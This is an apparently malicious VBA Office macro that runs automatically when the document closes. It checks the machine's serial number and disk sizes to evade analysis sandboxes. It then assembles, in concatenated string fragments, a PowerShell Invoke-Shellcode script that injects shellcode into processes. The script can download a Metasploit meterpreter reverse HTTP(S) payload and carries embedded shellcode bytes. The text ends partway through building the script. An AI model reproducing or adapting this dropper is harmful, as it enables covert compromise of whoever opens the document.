Sub AutoClose()
        UyGSv
End Sub

Public Function UyGSv() As Variant
        strComputer = "."
        Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
        Set ID = objWMIService.ExecQuery("Select IdentifyingNumber from Win32_ComputerSystemproduct")
        For Each objItem In ID
                If StrComp(objItem.IdentifyingNumber, "2UA20511KN") = 0 Then End
        Next
        Set disksize = objWMIService.ExecQuery("Select Size from Win32_logicaldisk")
        For Each objItem In disksize
                If (objItem.Size = 42949603328#) Then End
                If (objItem.Size = 68719443968#) Then End
        Next
        Dim SmIco As String
        SmIco = "function Invoke-Shellcode
{
[CmdletBinding( Defaul"
        SmIco = SmIco + "tParameterSetName = 'RunLocal', SupportsShouldProc"
        SmIco = SmIco + "ess = $True , ConfirmImpact = 'High')] Param (
   "
        SmIco = SmIco + " [ValidateNotNullOrEmpty()]
    [UInt16]
    $Proc"
        SmIco = SmIco + "essID,
    [Parameter( ParameterSetName = 'RunLoca"
        SmIco = SmIco + "l' )]
    [ValidateNotNullOrEmpty()]
    [Byte[]]
"
        SmIco = SmIco + "    $Shellcode,
    [Parameter( ParameterSetName ="
        SmIco = SmIco + " 'Metasploit' )]
    [ValidateSet( 'windows/meterp"
        SmIco = SmIco + "reter/reverse_http',
                  'windows/me"
        SmIco = SmIco + "terpreter/reverse_https',
                  Ignore"
        SmIco = SmIco + "Case = $True )]
    [String]
    $Payload = 'windo"
        SmIco = SmIco + "ws/meterpreter/reverse_http',
    [Parameter( Para"
        SmIco = SmIco + "meterSetName = 'ListPayloads' )]
    [Switch]
    "
        SmIco = SmIco + "$ListMetasploitPayloads,
    [Parameter( Mandatory"
        SmIco = SmIco + " = $True,
                ParameterSetName = 'Meta"
        SmIco = SmIco + "sploit' )]
    [ValidateNotNullOrEmpty()]
    [Str"
        SmIco = SmIco + "ing]
    $Lhost = '127.0.0.1',
    [Parameter( Man"
        SmIco = SmIco + "datory = $True,
                ParameterSetName ="
        SmIco = SmIco + " 'Metasploit' )]
    [ValidateRange( 1,65535 )]
  "
        SmIco = SmIco + "  [Int]
    $Lport = 8443,
    [Parameter( Paramet"
        SmIco = SmIco + "erSetName = 'Metasploit' )]
    [ValidateNotNull()"
        SmIco = SmIco + "]
    [String]
    $UserAgent = (Get-ItemProperty "
        SmIco = SmIco + "-Path 'HKCU:\Software\Microsoft\Windows\CurrentVer"
        SmIco = SmIco + "sion\Internet Settings').'User Agent',
    [Parame"
        SmIco = SmIco + "ter( ParameterSetName = 'Metasploit' )]
    [Valid"
        SmIco = SmIco + "ateNotNull()]
    [Switch]
    $Legacy = $False,
 "
        SmIco = SmIco + "   [Parameter( ParameterSetName = 'Metasploit' )]
"
        SmIco = SmIco + "    [ValidateNotNull()]
    [Switch]
    $Proxy = "
        SmIco = SmIco + "$False,
    [Switch]
    $Force = $False
)
    Set"
        SmIco = SmIco + "-StrictMode -Version 2.0
    if ($PsCmdlet.Paramet"
        SmIco = SmIco + "erSetName -eq 'ListPayloads')
    {
        $Avail"
        SmIco = SmIco + "ablePayloads = (Get-Command Invoke-Shellcode).Para"
        SmIco = SmIco + "meters['Payload'].Attributes |
            Where-O"
        SmIco = SmIco + "bject {$_.TypeId -eq [System.Management.Automation"
        SmIco = SmIco + ".ValidateSetAttribute]}
        foreach ($Payload "
        SmIco = SmIco + "in $AvailablePayloads.ValidValues)
        {
     "
        SmIco = SmIco + "       New-Object PSObject -Property @{ Payloads ="
        SmIco = SmIco + " $Payload }
        }
        Return
    }
    if "
        SmIco = SmIco + "( $PSBoundParameters['ProcessID'] )
    {
        "
        SmIco = SmIco + "Get-Process -Id $ProcessID -ErrorAction Stop | Out"
        SmIco = SmIco + "-Null
    }
    function Local:Get-DelegateType
  "
        SmIco = SmIco + "  {
        Param
        (
            [OutputTyp"
        SmIco = SmIco + "e([Type])]
            [Parameter( Position = 0)]
"
        SmIco = SmIco + "            [Type[]]
            $Parameters = (Ne"
        SmIco = SmIco + "w-Object Type[](0)),
            [Parameter( Posit"
        SmIco = SmIco + "ion = 1 )]
            [Type]
            $ReturnT"
        SmIco = SmIco + "ype = [Void]
        )
        $Domain = [AppDomai"
        SmIco = SmIco + "n]::CurrentDomain
        $DynAssembly = New-Objec"
        SmIco = SmIco + "t System.Reflection.AssemblyName('ReflectedDelegat"
        SmIco = SmIco + "e')
        $AssemblyBuilder = $Domain.DefineDynam"
        SmIco = SmIco + "icAssembly($DynAssembly, [System.Reflection.Emit.A"
        SmIco = SmIco + "ssemblyBuilderAccess]::Run)
        $ModuleBuilder"
        SmIco = SmIco + " = $AssemblyBuilder.DefineDynamicModule('InMemoryM"
        SmIco = SmIco + "odule', $false)
        $TypeBuilder = $ModuleBuil"
        SmIco = SmIco + "der.DefineType('MyDelegateType', 'Class, Public, S"
        SmIco = SmIco + "ealed, AnsiClass, AutoClass', [System.MulticastDel"
        SmIco = SmIco + "egate])
        $ConstructorBuilder = $TypeBuilder"
        SmIco = SmIco + ".DefineConstructor('RTSpecialName, HideBySig, Publ"
        SmIco = SmIco + "ic', [System.Reflection.CallingConventions]::Stand"
        SmIco = SmIco + "ard, $Parameters)
        $ConstructorBuilder.SetI"
        SmIco = SmIco + "mplementationFlags('Runtime, Managed')
        $Me"
        SmIco = SmIco + "thodBuilder = $TypeBuilder.DefineMethod('Invoke', "
        SmIco = SmIco + "'Public, HideBySig, NewSlot, Virtual', $ReturnType"
        SmIco = SmIco + ", $Parameters)
        $MethodBuilder.SetImplement"
        SmIco = SmIco + "ationFlags('Runtime, Managed')
        Write-Outpu"
        SmIco = SmIco + "t $TypeBuilder.CreateType()
    }
    function Loc"
        SmIco = SmIco + "al:Get-ProcAddress
    {
        Param
        (
 "
        SmIco = SmIco + "           [OutputType([IntPtr])]
            [Par"
        SmIco = SmIco + "ameter( Position = 0, Mandatory = $True )]
       "
        SmIco = SmIco + "     [String]
            $Module,
            [Pa"
        SmIco = SmIco + "rameter( Position = 1, Mandatory = $True )]
      "
        SmIco = SmIco + "      [String]
            $Procedure
        )
  "
        SmIco = SmIco + "      $SystemAssembly = [AppDomain]::CurrentDomain"
        SmIco = SmIco + ".GetAssemblies() |
            Where-Object { $_.G"
        SmIco = SmIco + "lobalAssemblyCache -And $_.Location.Split('\\')[-1"
        SmIco = SmIco + "].Equals('System.dll') }
        $UnsafeNativeMeth"
        SmIco = SmIco + "ods = $SystemAssembly.GetType('Microsoft.Win32.Uns"
        SmIco = SmIco + "afeNativeMethods')
        $GetModuleHandle = $Uns"
        SmIco = SmIco + "afeNativeMethods.GetMethod('GetModuleHandle')
    "
        SmIco = SmIco + "    $GetProcAddress = $UnsafeNativeMethods.GetMeth"
        SmIco = SmIco + "od('GetProcAddress', [Type[]]@([System.Runtime.Int"
        SmIco = SmIco + "eropServices.HandleRef], [String]))
        $Kern3"
        SmIco = SmIco + "2Handle = $GetModuleHandle.Invoke($null, @($Module"
        SmIco = SmIco + "))
        $tmpPtr = New-Object IntPtr
        $Ha"
        SmIco = SmIco + "ndleRef = New-Object System.Runtime.InteropService"
        SmIco = SmIco + "s.HandleRef($tmpPtr, $Kern32Handle)
        Write-"
        SmIco = SmIco + "Output $GetProcAddress.Invoke($null, @([System.Run"
        SmIco = SmIco + "time.InteropServices.HandleRef]$HandleRef, $Proced"
        SmIco = SmIco + "ure))
    }
    function Local:Emit-CallThreadStub"
        SmIco = SmIco + " ([IntPtr] $BaseAddr, [IntPtr] $ExitThreadAddr, [I"
        SmIco = SmIco + "nt] $Architecture)
    {
        $IntSizePtr = $Ar"
        SmIco = SmIco + "chitecture / 8
        function Local:ConvertTo-Li"
        SmIco = SmIco + "ttleEndian ([IntPtr] $Address)
        {
         "
        SmIco = SmIco + "   $LittleEndianByteArray = New-Object Byte[](0)
 "
        SmIco = SmIco + "           $Address.ToString("X$($IntSizePtr*2)") "
        SmIco = SmIco + "-split '([A-F0-9]{2})' | ForEach-Object { if ($_) "
        SmIco = SmIco + "{ $LittleEndianByteArray += [Byte] ('0x{0}' -f $_)"
        SmIco = SmIco + " } }
            [System.Array]::Reverse($LittleEn"
        SmIco = SmIco + "dianByteArray)
            Write-Output $LittleEnd"
        SmIco = SmIco + "ianByteArray
        }
        $CallStub = New-Obj"
        SmIco = SmIco + "ect Byte[](0)
        if ($IntSizePtr -eq 8)
     "
        SmIco = SmIco + "   {
            [Byte[]] $CallStub = 0x48,0xB8   "
        SmIco = SmIco + "                   # MOV   QWORD RAX, &shellcode
 "
        SmIco = SmIco + "           $CallStub += ConvertTo-LittleEndian $Ba"
        SmIco = SmIco + "seAddr       # &shellcode
            $CallStub +="
        SmIco = SmIco + " 0xFF,0xD0                              # CALL  RA"
        SmIco = SmIco + "X
            $CallStub += 0x6A,0x00              "
        SmIco = SmIco + "                # PUSH  BYTE 0
            $CallSt"
        SmIco = SmIco + "ub += 0x48,0xB8                              # MOV"
        SmIco = SmIco + "   QWORD RAX, &ExitThread
            $CallStub +="
        SmIco = SmIco + " ConvertTo-LittleEndian $ExitThreadAddr # &ExitThr"
        SmIco = SmIco + "ead
            $CallStub += 0xFF,0xD0            "
        SmIco = SmIco + "                  # CALL  RAX
        }
        el"
        SmIco = SmIco + "se
        {
            [Byte[]] $CallStub = 0xB8"
        SmIco = SmIco + "                           # MOV   DWORD EAX, &she"
        SmIco = SmIco + "llcode
            $CallStub += ConvertTo-LittleEn"
        SmIco = SmIco + "dian $BaseAddr       # &shellcode
            $Cal"
        SmIco = SmIco + "lStub += 0xFF,0xD0                              # "
        SmIco = SmIco + "CALL  EAX
            $CallStub += 0x6A,0x00      "
        SmIco = SmIco + "                        # PUSH  BYTE 0
           "
        SmIco = SmIco + " $CallStub += 0xB8                                "
        SmIco = SmIco + "   # MOV   DWORD EAX, &ExitThread
            $Cal"
        SmIco = SmIco + "lStub += ConvertTo-LittleEndian $ExitThreadAddr # "
        SmIco = SmIco + "&ExitThread
            $CallStub += 0xFF,0xD0    "
        SmIco = SmIco + "                          # CALL  EAX
        }
  "
        SmIco = SmIco + "      Write-Output $CallStub
    }
    function Lo"
        SmIco = SmIco + "cal:Inject-RemoteShellcode ([Int] $ProcessID)
    "
        SmIco = SmIco + "{
        $hProcess = $OpenProcess.Invoke(0x001F0F"
        SmIco = SmIco + "FF, $false, $ProcessID) # ProcessAccessFlags.All ("
        SmIco = SmIco + "0x001F0FFF)
        if (!$hProcess)
        {
    "
        SmIco = SmIco + "        Throw "Unable to open a process handle for"
        SmIco = SmIco + " PID: $ProcessID"
        }
        $IsWow64 = $fa"
        SmIco = SmIco + "lse
        if ($64bitCPU) # Only perform theses c"
        SmIco = SmIco + "hecks if CPU is 64-bit
        {
            $IsWo"
        SmIco = SmIco + "w64Process.Invoke($hProcess, [Ref] $IsWow64) | Out"
        SmIco = SmIco + "-Null
            if ((!$IsWow64) -and $PowerShell"
        SmIco = SmIco + "32bit)
            {
                Throw 'Unable"
        SmIco = SmIco + " to inject 64-bit shellcode from within 32-bit Pow"
        SmIco = SmIco + "ershell. Use the 64-bit version of Powershell if y"
        SmIco = SmIco + "ou want this to work.'
            }
            e"
        SmIco = SmIco + "lseif ($IsWow64) # 32-bit Wow64 process
          "
        SmIco = SmIco + "  {
                if ($Shellcode32.Length -eq 0)"
        SmIco = SmIco + "
                {
                    Throw 'No s"
        SmIco = SmIco + "hellcode was placed in the $Shellcode32 variable!'"
        SmIco = SmIco + "
                }
                $Shellcode = $S"
        SmIco = SmIco + "hellcode32
            }
            else # 64-bit"
        SmIco = SmIco + " process
            {
                if ($Shellc"
        SmIco = SmIco + "ode64.Length -eq 0)
                {
            "
        SmIco = SmIco + "        Throw 'No shellcode was placed in the $She"
        SmIco = SmIco + "llcode64 variable!'
                }
            "
        SmIco = SmIco + "    $Shellcode = $Shellcode64
            }
      "
        SmIco = SmIco + "  }
        else # 32-bit CPU
        {
          "
        SmIco = SmIco + "  if ($Shellcode32.Length -eq 0)
            {
   "
        SmIco = SmIco + "             Throw 'No shellcode was placed in the"
        SmIco = SmIco + " $Shellcode32 variable!'
            }
           "
        SmIco = SmIco + " $Shellcode = $Shellcode32
        }
        $Remo"
        SmIco = SmIco + "teMemAddr = $VirtualAllocEx.Invoke($hProcess, [Int"
        SmIco = SmIco + "Ptr]::Zero, $Shellcode.Length + 1, 0x3000, 0x40) #"
        SmIco = SmIco + " (Reserve|Commit, RWX)
        if (!$RemoteMemAddr"
        SmIco = SmIco + ")
        {
            Throw "Unable to allocate "
        SmIco = SmIco + "shellcode memory in PID: $ProcessID"
        }
   "
        SmIco = SmIco + "     $WriteProcessMemory.Invoke($hProcess, $Remote"
        SmIco = SmIco + "MemAddr, $Shellcode, $Shellcode.Length, [Ref] 0) |"
        SmIco = SmIco + " Out-Null
        $ExitThreadAddr = Get-ProcAddres"
        SmIco = SmIco + "s kernel32.dll ExitThread
        if ($IsWow64)
  "
        SmIco = SmIco + "      {
            $CallStub = Emit-CallThreadStu"
        SmIco = SmIco + "b $RemoteMemAddr $ExitThreadAddr 32
        }
    "
        SmIco = SmIco + "    else
        {
            $CallStub = Emit-Ca"
        SmIco = SmIco + "llThreadStub $RemoteMemAddr $ExitThreadAddr 64
   "
        SmIco = SmIco + "     }
        $RemoteStubAddr = $VirtualAllocEx.I"
        SmIco = SmIco + "nvoke($hProcess, [IntPtr]::Zero, $CallStub.Length,"
        SmIco = SmIco + " 0x3000, 0x40) # (Reserve|Commit, RWX)
        if "
        SmIco = SmIco + "(!$RemoteStubAddr)
        {
            Throw "Un"
        SmIco = SmIco + "able to allocate thread call stub memory in PID: $"
        SmIco = SmIco + "ProcessID"
        }
        $WriteProcessMemory.I"
        SmIco = SmIco + "nvoke($hProcess, $RemoteStubAddr, $CallStub, $Call"
        SmIco = SmIco + "Stub.Length, [Ref] 0) | Out-Null
        $ThreadHa"
        SmIco = SmIco + "ndle = $CreateRemoteThread.Invoke($hProcess, [IntP"
        SmIco = SmIco + "tr]::Zero, 0, $RemoteStubAddr, $RemoteMemAddr, 0, "
        SmIco = SmIco + "[IntPtr]::Zero)
        if (!$ThreadHandle)
      "
        SmIco = SmIco + "  {
            Throw "Unable to launch remote thr"
        SmIco = SmIco + "ead in PID: $ProcessID"
        }
        $CloseHa"
        SmIco = SmIco + "ndle.Invoke($hProcess) | Out-Null
    }
    functi"
        SmIco = SmIco + "on Local:Inject-LocalShellcode
    {
        if ($"
        SmIco = SmIco + "PowerShell32bit) {
            if ($Shellcode32.Le"
        SmIco = SmIco + "ngth -eq 0)
            {
                Throw 'N"
        SmIco = SmIco + "o shellcode was placed in the $Shellcode32 variabl"
        SmIco = SmIco + "e!'
                return
            }
         "
        SmIco = SmIco + "   $Shellcode = $Shellcode32
        }
        els"
        SmIco = SmIco + "e
        {
            if ($Shellcode64.Length -e"
        SmIco = SmIco + "q 0)
            {
                Throw 'No shell"
        SmIco = SmIco + "code was placed in the $Shellcode64 variable!'
   "
        SmIco = SmIco + "             return
            }
            $She"
        SmIco = SmIco + "llcode = $Shellcode64
        }
        $BaseAddre"
        SmIco = SmIco + "ss = $VirtualAlloc.Invoke([IntPtr]::Zero, $Shellco"
        SmIco = SmIco + "de.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RW"
        SmIco = SmIco + "X)
        if (!$BaseAddress)
        {
          "
        SmIco = SmIco + "  Throw "Unable to allocate shellcode memory in PI"
        SmIco = SmIco + "D: $ProcessID"
        }
        [System.Runtime.I"
        SmIco = SmIco + "nteropServices.Marshal]::Copy($Shellcode, 0, $Base"
        SmIco = SmIco + "Address, $Shellcode.Length)
        $ExitThreadAdd"
        SmIco = SmIco + "r = Get-ProcAddress kernel32.dll ExitThread
      "
        SmIco = SmIco + "  if ($PowerShell32bit)
        {
            $Cal"
        SmIco = SmIco + "lStub = Emit-CallThreadStub $BaseAddress $ExitThre"
        SmIco = SmIco + "adAddr 32
        }
        else
        {
       "
        SmIco = SmIco + "     $CallStub = Emit-CallThreadStub $BaseAddress "
        SmIco = SmIco + "$ExitThreadAddr 64
        }
        $CallStubAddr"
        SmIco = SmIco + "ess = $VirtualAlloc.Invoke([IntPtr]::Zero, $CallSt"
        SmIco = SmIco + "ub.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RW"
        SmIco = SmIco + "X)
        if (!$CallStubAddress)
        {
      "
        SmIco = SmIco + "      Throw "Unable to allocate thread call stub.""
        SmIco = SmIco + "
        }
        [System.Runtime.InteropServices"
        SmIco = SmIco + ".Marshal]::Copy($CallStub, 0, $CallStubAddress, $C"
        SmIco = SmIco + "allStub.Length)
        $ThreadHandle = $CreateThr"
        SmIco = SmIco + "ead.Invoke([IntPtr]::Zero, 0, $CallStubAddress, $B"
        SmIco = SmIco + "aseAddress, 0, [IntPtr]::Zero)
        if (!$Threa"
        SmIco = SmIco + "dHandle)
        {
            Throw "Unable to la"
        SmIco = SmIco + "unch thread."
        }
        $WaitForSingleObje"
        SmIco = SmIco + "ct.Invoke($ThreadHandle, 0xFFFFFFFF) | Out-Null
  "
        SmIco = SmIco + "      $VirtualFree.Invoke($CallStubAddress, $CallS"
        SmIco = SmIco + "tub.Length + 1, 0x8000) | Out-Null # MEM_RELEASE ("
        SmIco = SmIco + "0x8000)
        $VirtualFree.Invoke($BaseAddress, "
        SmIco = SmIco + "$Shellcode.Length + 1, 0x8000) | Out-Null # MEM_RE"
        SmIco = SmIco + "LEASE (0x8000)
    }
    $IsWow64ProcessAddr = Get"
        SmIco = SmIco + "-ProcAddress kernel32.dll IsWow64Process
    if ($"
        SmIco = SmIco + "IsWow64ProcessAddr)
    {
        $IsWow64ProcessD"
        SmIco = SmIco + "elegate = Get-DelegateType @([IntPtr], [Bool].Make"
        SmIco = SmIco + "ByRefType()) ([Bool])
        $IsWow64Process = [S"
        SmIco = SmIco + "ystem.Runtime.InteropServices.Marshal]::GetDelegat"
        SmIco = SmIco + "eForFunctionPointer($IsWow64ProcessAddr, $IsWow64P"
        SmIco = SmIco + "rocessDelegate)
        $64bitCPU = $true
    }
  "
        SmIco = SmIco + "  else
    {
        $64bitCPU = $false
    }
    "
        SmIco = SmIco + "if ([IntPtr]::Size -eq 4)
    {
        $PowerShel"
        SmIco = SmIco + "l32bit = $true
    }
    else
    {
        $Power"
        SmIco = SmIco + "Shell32bit = $false
    }
    if ($PsCmdlet.Parame"
        SmIco = SmIco + "terSetName -eq 'Metasploit')
    {
        if (!$P"
        SmIco = SmIco + "owerShell32bit) {
            $RootInvocation = $M"
        SmIco = SmIco + "yInvocation.Line
            $Response = $True
   "
        SmIco = SmIco + "         if ( $Force -or ( $Response = $psCmdlet.S"
        SmIco = SmIco + "houldContinue( "Do you want to launch the payload "
        SmIco = SmIco + "from x86 Powershell?",
                   "Attempt"
        SmIco = SmIco + " to execute 32-bit shellcode from 64-bit Powershel"
        SmIco = SmIco + "l. Note: This process takes about one minute. Be p"
        SmIco = SmIco + "atient! You will also see some artifacts of the sc"
        SmIco = SmIco + "ript loading in the other process." ) ) ) { }
    "
        SmIco = SmIco + "        if ( !$Response )
            {
          "
        SmIco = SmIco + "      Return
            }
            if ($MyInvo"
        SmIco = SmIco + "cation.BoundParameters['Force'])
            {
   "
        SmIco = SmIco + "             $Command = "function $($MyInvocation."
        SmIco = SmIco + "InvocationName) {`n" + $MyInvocation.MyCommand.Scr"
        SmIco = SmIco + "iptBlock + "`n}`n$($RootInvocation)`n`n"
         "
        SmIco = SmIco + "   }
            else
            {
              "
        SmIco = SmIco + "  $Command = "function $($MyInvocation.InvocationN"
        SmIco = SmIco + "ame) {`n" + $MyInvocation.MyCommand.ScriptBlock + "
        SmIco = SmIco + ""`n}`n$($RootInvocation) -Force`n`n"
            }"
        SmIco = SmIco + "
            $CommandBytes = [System.Text.Encoding"
        SmIco = SmIco + "]::Ascii.GetBytes($Command)
            $EncodedCo"
        SmIco = SmIco + "mmand = [Convert]::ToBase64String($CommandBytes)
 "
        SmIco = SmIco + "           $Execute = '$Command' + " | $Env:windir"
        SmIco = SmIco + "\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -N"
        SmIco = SmIco + "oProfile -Command -"
            Invoke-Expression"
        SmIco = SmIco + " -Command $Execute | Out-Null
            Return
 "
        SmIco = SmIco + "       }
        $Response = $True
        if ( $F"
        SmIco = SmIco + "orce -or ( $Response = $psCmdlet.ShouldContinue( ""
        SmIco = SmIco + "Do you know what you're doing?",
               "A"
        SmIco = SmIco + "bout to download Metasploit payload '$($Payload)' "
        SmIco = SmIco + "LHOST=$($Lhost), LPORT=$($Lport)" ) ) ) { }
      "
        SmIco = SmIco + "  if ( !$Response )
        {
            Return
 "
        SmIco = SmIco + "       }
        switch ($Payload)
        {
     "
        SmIco = SmIco + "       'windows/meterpreter/reverse_http'
        "
        SmIco = SmIco + "    {
                $SSL = ''
            }
    "
        SmIco = SmIco + "        'windows/meterpreter/reverse_https'
      "
        SmIco = SmIco + "      {
                $SSL = 's'
               "
        SmIco = SmIco + " [System.Net.ServicePointManager]::ServerCertifica"
        SmIco = SmIco + "teValidationCallback = {$True}
            }
     "
        SmIco = SmIco + "   }
        if ($Legacy)
        {
            $R"
        SmIco = SmIco + "equest = "http$($SSL)://$($Lhost):$($Lport)/INITM""
        SmIco = SmIco + "
        } else {
            $CharArray = 48..57 "
        SmIco = SmIco + "+ 65..90 + 97..122 | ForEach-Object {[Char]$_}
   "
        SmIco = SmIco + "         $SumTest = $False
            while ($Sum"
        SmIco = SmIco + "Test -eq $False)
            {
                $Ge"
        SmIco = SmIco + "neratedUri = $CharArray | Get-Random -Count 4
    "
        SmIco = SmIco + "            $SumTest = (([int[]] $GeneratedUri | M"
        SmIco = SmIco + "easure-Object -Sum).Sum % 0x100 -eq 92)
          "
        SmIco = SmIco + "  }
            $RequestUri = -join $GeneratedUri
"
        SmIco = SmIco + "            $Request = "http$($SSL)://$($Lhost):$("
        SmIco = SmIco + "$Lport)/$($RequestUri)"
        }
        $Uri = N"
        SmIco = SmIco + "ew-Object Uri($Request)
        $WebClient = New-O"
        SmIco = SmIco + "bject System.Net.WebClient
        $WebClient.Head"
        SmIco = SmIco + "ers.Add('user-agent', "$UserAgent")
        if ($P"
        SmIco = SmIco + "roxy)
        {
            $WebProxyObject = New-"
        SmIco = SmIco + "Object System.Net.WebProxy
            $ProxyAddre"
        SmIco = SmIco + "ss = (Get-ItemProperty -Path 'HKCU:\Software\Micro"
        SmIco = SmIco + "soft\Windows\CurrentVersion\Internet Settings').Pr"
        SmIco = SmIco + "oxyServer
            if ($ProxyAddress)
         "
        SmIco = SmIco + "   {
                $WebProxyObject.Address = $Pr"
        SmIco = SmIco + "oxyAddress
                $WebProxyObject.UseDefa"
        SmIco = SmIco + "ultCredentials = $True
                $WebClientO"
        SmIco = SmIco + "bject.Proxy = $WebProxyObject
            }
      "
        SmIco = SmIco + "  }
        try
        {
            [Byte[]] $Sh"
        SmIco = SmIco + "ellcode32 = $WebClient.DownloadData($Uri)
        "
        SmIco = SmIco + "}
        catch
        {
            Throw "$($Er"
        SmIco = SmIco + "ror[0])"
        }
        [Byte[]] $Shellcode64 ="
        SmIco = SmIco + " $Shellcode32
    }
    elseif ($PSBoundParameters"
        SmIco = SmIco + "['Shellcode'])
    {
        [Byte[]] $Shellcode32"
        SmIco = SmIco + " = $Shellcode
        [Byte[]] $Shellcode64 = $She"
        SmIco = SmIco + "llcode32
    }
    else
    {
        [Byte[]] $Sh"
        SmIco = SmIco + "ellcode32 = @(0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0"
        SmIco = SmIco + "x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,
     "
        SmIco = SmIco + "                             0x52,0x0c,0x8b,0x52,0"
        SmIco = SmIco + "x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0"
        SmIco = SmIco + "x31,0xc0,
                                  0xac,0"
        SmIco = SmIco + "x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0"
        SmIco = SmIco + "xc7,0xe2,0xf0,0x52,0x57,
                         "
        SmIco = SmIco + "         0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0"
        SmIco = SmIco + "x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,
          "
        SmIco = SmIco + "                        0xd0,0x50,0x8b,0x48,0x18,0"
        SmIco = SmIco + "x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0"
        SmIco = SmIco + "x8b,
                                  0x01,0xd6,0"
        SmIco = SmIco + "x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0"
        SmIco = SmIco + "x38,0xe0,0x75,0xf4,
                              "
        SmIco = SmIco + "    0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0"
        SmIco = SmIco + "x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,
               "
        SmIco = SmIco + "                   0x0c,0x4b,0x8b,0x58,0x1c,0x01,0"
        SmIco = SmIco + "xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,
"
        SmIco = SmIco + "                                  0x5b,0x5b,0x61,0"
        SmIco = SmIco + "x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0"
        SmIco = SmIco + "xeb,0x86,0x5d,
                                  0"
        SmIco = SmIco + "x6a,0x01,0x8d,0x85,0xb9,0x00,0x00,0x00,0x50,0x68,0"
        SmIco = SmIco + "x31,0x8b,0x6f,0x87,0xff,0xd5,
                    "
        SmIco = SmIco + "              0xbb,0xe0,0x1d,0x2a,0x0a,0x68,0xa6,0"
        SmIco = SmIco + "x95,0xbd,0x9d,0xff,0xd5,0x3c,0x06,0x7c,0x0a,
     "
        SmIco = SmIco + "                             0x80,0xfb,0xe0,0x75,0"
        SmIco = SmIco + "x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x53,0xff,0"
        SmIco = SmIco + "xd5,0x63,
                                  0x61,0"
        SmIco = SmIco + "x6c,0x63,0x00)
        [Byte[]] $Shellcode64 = @(0"
        SmIco = SmIco + "xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0"
        SmIco = SmIco + "x41,0x51,0x41,0x50,0x52,0x51,
                    "
        SmIco = SmIco + "              0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0"
        SmIco = SmIco + "x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,
     "
        SmIco = SmIco + "                             0x20,0x48,0x8b,0x72,0"
        SmIco = SmIco + "x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0"
        SmIco = SmIco + "x31,0xc0,
                                  0xac,0"
        SmIco = SmIco + "x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0"
        SmIco = SmIco + "x41,0x01,0xc1,0xe2,0xed,
                         "
        SmIco = SmIco + "         0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0"
        SmIco = SmIco + "x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,
          "
        SmIco = SmIco + "                        0x00,0x00,0x00,0x48,0x85,0"
        SmIco = SmIco + "xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0"
        SmIco = SmIco + "x44,
                                  0x8b,0x40,0"
        SmIco = SmIco + "x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0"
        SmIco = SmIco + "x8b,0x34,0x88,0x48,
                              "
        SmIco = SmIco + "    0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0"
        SmIco = SmIco + "x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,
               "
        SmIco = SmIco + "                   0x38,0xe0,0x75,0xf1,0x4c,0x03,0"
        SmIco = SmIco + "x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,
"
        SmIco = SmIco + "                                  0x8b,0x40,0x24,0"
        SmIco = SmIco + "x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0"
        SmIco = SmIco + "x40,0x1c,0x49,
                                  0"
        SmIco = SmIco + "x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0"
        SmIco = SmIco + "x58,0x41,0x58,0x5e,0x59,0x5a,
                    "
        SmIco = SmIco + "              0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0"
        SmIco = SmIco + "x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,
     "
        SmIco = SmIco + "                             0x59,0x5a,0x48,0x8b,0"
        SmIco = SmIco + "x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0"
        SmIco = SmIco + "x00,0x00,
                                  0x00,0"
        SmIco = SmIco + "x00,0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0"
        SmIco = SmIco + "x00,0x41,0xba,0x31,0x8b,
                         "
        SmIco = SmIco + "         0x6f,0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0"
        SmIco = SmIco + "x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
          "
        SmIco = SmIco + "                        0xd5,0x48,0x83,0xc4,0x28,0"
        SmIco = SmIco + "x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0"
        SmIco = SmIco + "x47,
                                  0x13,0x72,0"
        SmIco = SmIco + "x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0"
        SmIco = SmIco + "x61,0x6c,0x63,0x00)
    }
    if ( $PSBoundParamet"
        SmIco = SmIco + "ers['ProcessID'] )
    {
        $OpenProcessAddr "
